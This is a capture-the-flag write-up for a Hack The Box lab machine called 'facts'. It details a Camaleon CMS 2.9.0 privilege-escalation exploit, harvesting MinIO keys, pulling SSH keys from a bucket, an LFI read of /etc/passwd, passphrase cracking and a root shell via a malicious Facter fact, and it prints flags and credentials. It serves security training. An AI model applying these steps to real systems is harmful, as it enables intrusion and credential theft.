# HTB Machine Writeup: facts

**User Flag:** 14a2aac9c70ffc933c83f410bfc2138a
**Root Flag:** d7d88557e1e81b350e42dc1bf6d66e17

---

## 1. Reconnaissance

Add to /etc/hosts:
```
echo '10.129.244.96  facts.htb' | sudo tee -a /etc/hosts
```

Nmap scan:
```
nmap -sC -sV -p- facts.htb

PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http  (Camaleon CMS 2.9.0)
54321/tcp filtered unknown  (MinIO - internal only)
```

Gobuster to find admin panel:
```
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt
# Finds: /admin/login
```

---

## 2. CMS Privilege Escalation

Register a low-level account at `http://facts.htb/admin/login` (username: test, password: test).

Camaleon CMS 2.9.0 has an authenticated privilege escalation vulnerability where a client-role user can elevate themselves to admin via an unprotected AJAX endpoint.

Run the exploit:
```
python3 exp.py -u http://facts.htb -U test -P test

[+] Login confirmed
    Current User Role: client
    Updated User Role: admin
```

Log back in — you now have full admin access.

---

## 3. Harvest MinIO Credentials

Navigate to **Settings → General Site → Filesystem Settings**:
```
Access Key: AKIA2539277858C9DD3F
Secret Key: L4f9qcWjVvXxe8gdESNceDRYvMWuRj6GKi705ttz
Endpoint:   http://localhost:54321
```

---

## 4. MinIO Bucket Enumeration

Configure AWS CLI:
```
aws configure --profile facts
# Enter the keys above, region: us-east-1

aws configure set s3.signature_version s3v4 --profile facts
```

List buckets:
```
aws s3 ls --endpoint-url http://facts.htb:54321 --profile facts

# Returns: randomfacts, internal
```

Enumerate internal bucket:
```
aws s3 ls s3://internal --endpoint-url http://facts.htb:54321 --profile facts --recursive

# Finds: .ssh/authorized_keys, .ssh/id_ed25519
```

Sync SSH keys locally:
```
aws s3 sync s3://internal/.ssh ./ssh_loot --endpoint-url http://facts.htb:54321 --profile facts
```

---

## 5. Username Discovery via LFI

Camaleon CMS 2.9.0 also has an LFI vulnerability via the media download endpoint. Use it to read /etc/passwd:
```
python3 lfi.py -u http://facts.htb -l test -p test /etc/passwd

# Reveals users:
# trivia:x:1000:1000::/home/trivia:/bin/bash
# william:x:1001:1001::/home/william:/bin/bash
```

---

## 6. Crack SSH Key & Get User Flag

```
cd ssh_loot
ssh2john id_ed25519 > key.john
john --wordlist=/usr/share/wordlists/rockyou.txt key.john

# Cracked passphrase: dragonballz
```

SSH in:
```
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@facts.htb
# passphrase: dragonballz

cat /home/william/user.txt
# 14a2aac9c70ffc933c83f410bfc2138a
```

---

## 7. Privilege Escalation to Root

Check sudo permissions:
```
sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```

Facter loads Ruby scripts from a custom directory and runs them as root. Create a malicious fact:
```
mkdir -p /tmp/facts
echo 'Facter.add(:pwn) do
  setcode do
    system("/bin/bash")
  end
end' > /tmp/facts/pwn.rb

sudo /usr/bin/facter --custom-dir /tmp/facts

# Drops into root shell
id
# uid=0(root) gid=0(root)

cat /root/root.txt
# d7d88557e1e81b350e42dc1bf6d66e17
```

---

## Attack Chain Summary

Recon → Camaleon CMS priv esc (client→admin) → harvest MinIO S3 creds → enumerate internal bucket → find SSH keys → LFI to get username (trivia) → crack SSH key passphrase (dragonballz) → SSH in → Facter sudo exploit → root